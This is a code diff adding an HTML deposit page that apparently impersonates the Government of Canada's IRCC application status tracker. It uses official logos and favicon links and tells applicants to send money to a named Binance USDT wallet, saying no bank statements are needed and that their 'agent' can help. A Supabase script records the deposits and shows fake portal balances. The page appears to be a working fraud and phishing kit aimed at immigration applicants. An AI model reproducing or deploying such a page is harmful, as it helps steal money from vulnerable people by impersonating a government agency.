@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://ircc-tracker-suivi.apps.cic.gc.ca/favicon.png">
+    <title>Deposit Amount</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #f5f5f5;
+        }
+
+        .header-actions-container {
+            display: flex;
+            justify-content: end;
+            align-items: center;
+        }
+
+        .brand {
+            padding: 32px 0 12px 25px;
+        }
+
+        #canada-home-img {
+            max-width: 100%;
+        }
+
+        .container {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        hr {
+            border-top: 2px solid #26374a;
+            margin: 0;
+            opacity: 1;
+        }
+
+        .nav-container {
+            padding: 15px 20px;
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        .top-links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+
+        .top-links a {
+            color: #284162;
+            text-decoration: underline;
+            font-size: 14px;
+        }
+
+        .gov-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .flag {
+            width: 30px;
+            height: auto;
+        }
+
+        .gov-text {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .gov-text span {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+
+        .header svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        h2 {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 18px;
+        }
+
+        p {
+            text-align: center;
+            margin: 10px 0;
+            color: #666;
+        }
+
+        .tabs {
+            display: flex;
+            margin: 20px 0;
+            width: 100%;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background-color: #f0f0f0;
+            cursor: pointer;
+        }
+
+        .tab.active {
+            background-color: #fff;
+            border-bottom: 2px solid #000;
+        }
+
+        .deposit-card {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .account-details {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .account-details p {
+            margin: 10px 0;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .amount-input {
+            position: relative;
+            margin: 25px 0;
+        }
+
+        .amount-input span {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+        }
+
+        .amount-input input {
+            width: 100%;
+            padding: 12px 12px 12px 25px;
+            font-size: 16px;
+            border: 2px solid #000;
+            box-sizing: border-box;
+            border-radius: 4px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .deposit-label {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .deposit-button {
+            background: white;
+            border: 2px solid #000;
+            padding: 10px 25px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .deposit-button:hover {
+            background: #000;
+            color: white;
+        }
+
+        .deposit-info-card {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+
+        .deposit-info-card h3 {
+            color: #333;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        .deposit-info-card p {
+            margin: 10px 0;
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+
+        .deposit-info-card span {
+            font-weight: bold;
+            color: #284162;
+        }
+
+        .deposit-info-card hr {
+            margin: 20px 0;
+            border-top: 1px solid #eee;
+        }
+
+        .deposit-form {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .page-footer a {
+            font-size: 14px;
+            color: #284262;
+            text-decoration: none;
+        }
+        .page-footer .button-report {
+            font-size: 16px;
+            width: 360px;
+            margin-top: 2em;
+        }
+        .page-footer-nav-items {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .page-footer-nav-items li {
+            margin: 0 1rem;
+        }
+        .page-footer-nav-items li:first-child {
+            list-style: none;
+        }
+        .date-modified {
+            margin-top: 2em;
+        }
+        .page-footer-container {
+            border-top: 2px solid black;
+            background-color: #f3f4f6;
+            line-height: 65px;
+            width: 100%;
+        }
+        .page-footer-content {
+            display: flex;
+            margin-top: 1.5em;
+            padding-bottom: 1em;
+        }
+        .page-footer-image-container {
+            flex: auto;
+            text-align: end;
+            align-self: flex-end;
+            padding-right: 53px;
+        }
+        .logo {
+            height: 40px;
+            margin-top: -27px;
+            margin-right: 3px;
+        }
+        .button-report:focus-within {
+            outline: solid;
+        }
+        @media only screen and (max-width: 768px) {
+            .page-footer .button-report {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header id="header">
+        <div class="container">
+            <div class="row">
+                <div class="brand col-xs-9 col-md-4 col-sm-6 col">
+                    <a id="canada-home-img-link" target="_blank" href="application.html">
+                        <img id="canada-home-img" src="Sign%20in%20to%20your%20Application%20Status%20Tracker%20account_files/canada_logo_header_en.svg" alt="Government of Canada header logo">
+                    </a>
+                </div>
+                <div class="header-actions-container col">
+                </div>
+            </div>
+        </div>
+        <hr>
+        <nav property="breadcrumb" role="navigation" aria-label="navigation">
+            <div class="container">
+                <div class="container">
+                    <ol class="breadcrumb">
+                    </ol>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <div class="container">
+        <div class="deposit-info-card">
+            <h3>Please Deposit into the following account</h3>
+            <p>Binance ID: <span id="binanceId">Loading...</span></p>
+            <p>Binance Name: <span id="binanceName">Loading...</span></p>
+            <p>Wallet Name: <span id="walletName">Loading...</span></p>
+            <hr>
+            <p>Current Balance: <span id="balance">Loading...</span></p>
+            <p>Application ID: <span id="applicationId">Loading...</span></p>
+        </div>
+        <div class="deposit-info-card">
+            <p>Please note that no bank statements are required. You must ensure the funds are visible in your portal balance for verification purposes. If you need assistance with this process, please reach out to your agent to help facilitate the payment.</p>
+        </div>
+        <div class="deposit-card">
+            <h2>Deposit Details</h2>
+            <div class="account-details">
+                <p><strong>Binance ID:</strong> 173274353</p>
+                <p><strong>Binance Name:</strong> CBFW</p>
+                <p><strong>Wallet Name:</strong> USDT Wallet</p>
+            </div>
+            <div class="amount-input">
+                <span>$</span>
+                <input type="number" id="amount" placeholder="Enter amount" min="0" step="0.01">
+            </div>
+
+            <div class="button-container">
+                <span class="deposit-label">Amount to Deposit</span>
+                <button class="deposit-button" id="depositButton">Deposit</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="js/supabase.js"></script>
+    <script>
+        let currentUser = null;
+
+        // Load wallet info
+        async function loadWalletInfo() {
+            try {
+                const { data, error } = await supabase
+                    .from('deposit_details')
+                    .select('*')
+                    .limit(1)
+                    .single();
+
+                if (error) throw error;
+
+                if (data) {
+                    document.getElementById('binanceId').textContent = data.binance_id;
+                    document.getElementById('binanceName').textContent = data.binance_name;
+                    document.getElementById('walletName').textContent = data.wallet_name;
+                }
+            } catch (error) {
+                console.error('Error loading wallet info:', error);
+                document.getElementById('binanceId').textContent = 'Error loading data';
+                document.getElementById('binanceName').textContent = 'Error loading data';
+                document.getElementById('walletName').textContent = 'Error loading data';
+            }
+        }
+
+        // Load user balance and application ID
+        async function loadUserInfo() {
+            try {
+                if (!currentUser) return;
+
+                const { data: userData, error } = await supabase
+                    .from('users')
+                    .select('balance, application_id')
+                    .eq('id', currentUser.id)
+                    .single();
+
+                if (error) throw error;
+
+                if (userData) {
+                    document.getElementById('balance').textContent = `$${userData.balance.toFixed(2)}`;
+                    document.getElementById('applicationId').textContent = userData.application_id;
+                }
+            } catch (error) {
+                console.error('Error loading user info:', error);
+                document.getElementById('balance').textContent = 'Error loading balance';
+                document.getElementById('applicationId').textContent = 'Error loading ID';
+            }
+        }
+
+        async function loadUserData() {
+            try {
+                if (!currentUser) return;
+
+                const { data: userData, error } = await supabase
+                    .from('users')
+                    .select('balance, application_id')
+                    .eq('id', currentUser.id)
+                    .single();
+
+                if (error) throw error;
+
+                if (userData) {
+                    document.getElementById('currentBalance').textContent = formatCurrency(userData.balance);
+                    document.getElementById('applicationId').textContent = `Application ID: ${userData.application_id}`;
+                }
+            } catch (error) {
+                console.error('Error loading user data:', error);
+                showNotification('Error loading user data');
+            }
+        }
+
+        async function handleDeposit() {
+            try {
+                if (!currentUser) {
+                    showNotification('Please sign in to make a deposit');
+                    return;
+                }
+
+                const amountInput = document.getElementById('amount');
+                const amount = parseFloat(amountInput.value);
+
+                if (isNaN(amount) || amount <= 0) {
+                    showNotification('Please enter a valid amount');
+                    return;
+                }
+
+                // Create deposit record with pending status
+                const { error: depositError } = await supabase
+                    .from('deposits')
+                    .insert([
+                        {
+                            user_id: currentUser.id,
+                            amount: amount,
+                            status: 'Pending',
+                            date_time: new Date().toISOString()
+                        }
+                    ]);
+
+                if (depositError) throw depositError;
+
+                // Clear form and show success message
+                amountInput.value = '';
+                showNotification('Deposit request submitted successfully. Status: Pending');
+                
+                // Redirect to deposit page to view status
+                setTimeout(() => {
+                    window.location.href = 'deposit.html';
+                }, 2000);
+
+            } catch (error) {
+                console.error('Error processing deposit:', error);
+                showNotification('Error submitting deposit request. Please try again.');
+            }
+        }
+
+        function showNotification(message) {
+            const notification = document.createElement('div');
+            notification.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#333;color:white;padding:10px 20px;border-radius:5px;z-index:1000;';
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 3000);
+        }
+
+        function formatCurrency(amount) {
+            return new Intl.NumberFormat('en-US', {
+                style: 'currency',
+                currency: 'USD'
+            }).format(amount);
+        }
+
+        function signOut() {
+            sessionStorage.removeItem('currentUser');
+            window.location.href = 'index.html';
+        }
+
+        // Initialize page
+        async function initializePage() {
+            // Check authentication
+            currentUser = await window.checkApplicationAuth();
+            if (!currentUser) return;
+
+            // Load all data
+            await Promise.all([
+                loadWalletInfo(),
+                loadUserInfo(),
+                loadUserData()
+            ]);
+        }
+
+        // Add event listeners
+        document.getElementById('depositButton').addEventListener('click', handleDeposit);
+        
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', initializePage);
+    </script>
+    <app-footer>
+        <footer class="page-footer">
+            <div class="container">
+                <dl class="date-modified">Version number: 1.2.1</dl>
+            </div>
+            <div class="page-footer-container">
+                <div class="container page-footer-content">
+                    <div class="page-footer-image-container">
+                        <img src="Sign%20in%20to%20your%20Application%20Status%20Tracker%20account_files/canada_logo_footer.svg" class="logo" alt="Symbol of the Government of Canada">
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </app-footer>
+</body>
+</html>
